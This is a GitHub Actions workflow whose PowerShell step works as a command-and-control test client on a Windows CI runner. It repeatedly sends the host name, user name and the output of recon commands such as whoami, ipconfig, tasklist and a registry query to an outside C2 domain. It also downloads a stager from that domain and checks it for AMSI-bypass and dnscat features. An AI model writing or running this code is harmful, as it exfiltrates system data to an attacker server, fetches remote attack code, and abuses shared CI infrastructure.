name: c2-exhaustive
on:
  workflow_dispatch:

jobs:
  full-test:
    runs-on: windows-2022
    timeout-minutes: 8
    steps:
      - name: Exhaustive C2 Test
        shell: powershell
        run: |
          $ErrorActionPreference = "Continue"
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          $C2 = "https://svc.linuxsupportsystem.com"
          $ID = "EXH-" + (-join((65..90)|Get-Random -Count 4|ForEach-Object{[char]$_}))
          function B($out) {
            $wc = New-Object Net.WebClient
            $wc.Headers.Add("Content-Type","application/json")
            $safe = ($out -replace '\','\\' -replace '"','\"' -replace "`n",'
' -replace "`r",'').Substring(0,[Math]::Min(500,$out.Length))
            $body = '{"id":"' + $ID + '","h":"' + $env:COMPUTERNAME + '","u":"' + $env:USERNAME + '","ip":"gh","os":"W22","pid":' + $PID + ',"out":"' + $safe + '"}'
            try { return ($wc.UploadString("$C2/b", $body) | ConvertFrom-Json).c } catch { return "" }
          }
          Write-Host "ID: $ID"
          $pass = 0; $total = 0
          
          $total++; Write-Host "T1: Beacon..."
          try { B "t1:ok" | Out-Null; Write-Host "  PASS"; $pass++ } catch { Write-Host "  FAIL" }
          
          $total++; Write-Host "T2: whoami..."
          try { $r = cmd /c whoami 2>&1; B "t2:$r" | Out-Null; Write-Host "  PASS: $r"; $pass++ } catch { Write-Host "  FAIL" }
          
          $total++; Write-Host "T3: hostname..."
          try { $r = cmd /c hostname 2>&1; B "t3:$r" | Out-Null; Write-Host "  PASS: $r"; $pass++ } catch { Write-Host "  FAIL" }
          
          $total++; Write-Host "T4: dir C:\..."
          try { $r = (cmd /c "dir C:\ /b" 2>&1 | Out-String).Trim(); B "t4:$r" | Out-Null; Write-Host "  PASS"; $pass++ } catch { Write-Host "  FAIL" }
          
          $total++; Write-Host "T5: ipconfig..."
          try { $r = (ipconfig | Out-String).Trim(); B "t5:$($r.Substring(0,200))" | Out-Null; Write-Host "  PASS"; $pass++ } catch { Write-Host "  FAIL" }
          
          $total++; Write-Host "T6: tasklist..."
          try { $r = (tasklist /fo csv /nh 2>&1 | Select -First 5 | Out-String).Trim(); B "t6:$r" | Out-Null; Write-Host "  PASS"; $pass++ } catch { Write-Host "  FAIL" }
          
          $total++; Write-Host "T7: registry..."
          try { $r = (reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName 2>&1 | Out-String).Trim(); B "t7:$r" | Out-Null; Write-Host "  PASS"; $pass++ } catch { Write-Host "  FAIL" }
          
          $total++; Write-Host "T8: env vars..."
          try { $r = "ARCH=$env:PROCESSOR_ARCHITECTURE TEMP=$env:TEMP"; B "t8:$r" | Out-Null; Write-Host "  PASS: $r"; $pass++ } catch { Write-Host "  FAIL" }
          
          $total++; Write-Host "T9: Get-Process..."
          try { $r = (Get-Process | Select -First 3 | Format-Table Name,Id -Auto | Out-String).Trim(); B "t9:$r" | Out-Null; Write-Host "  PASS"; $pass++ } catch { Write-Host "  FAIL" }
          
          $total++; Write-Host "T10: .NET..."
          try { $r = [System.Net.Dns]::GetHostName() + "|64bit=" + [Environment]::Is64BitProcess; B "t10:$r" | Out-Null; Write-Host "  PASS: $r"; $pass++ } catch { Write-Host "  FAIL" }
          
          $total++; Write-Host "T11: rapid beacons..."
          $ok = 0; for ($i=0; $i -lt 10; $i++) { try { B "rapid$i" | Out-Null; $ok++ } catch {} }
          B "t11:$ok/10" | Out-Null; Write-Host "  $ok/10"; if ($ok -ge 8) { $pass++ }
          
          $total++; Write-Host "T12: stager download..."
          try { $s = (New-Object Net.WebClient).DownloadString("$C2/s"); $checks = @(); if($s -match 'Tls12'){$checks+='TLS'}; if($s -match 'amsi'){$checks+='AMSI'}; if($s -match 'svc-b'){$checks+='Failover'}; if($s -match 'dnscat'){$checks+='DNS'}; B "t12:len=$($s.Length) features=$($checks-join',')" | Out-Null; Write-Host "  PASS: $($s.Length)ch features=$($checks-join',')"; $pass++ } catch { Write-Host "  FAIL" }
          
          $total++; Write-Host "T13: AMSI..."
          try { $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); B "t13:present=$($a-ne$null)" | Out-Null; Write-Host "  PASS: present=$($a-ne$null)"; $pass++ } catch { Write-Host "  FAIL" }
          
          B "RESULT: $pass/$total passed" | Out-Null
          Write-Host "`n=== RESULT: $pass/$total PASSED ==="
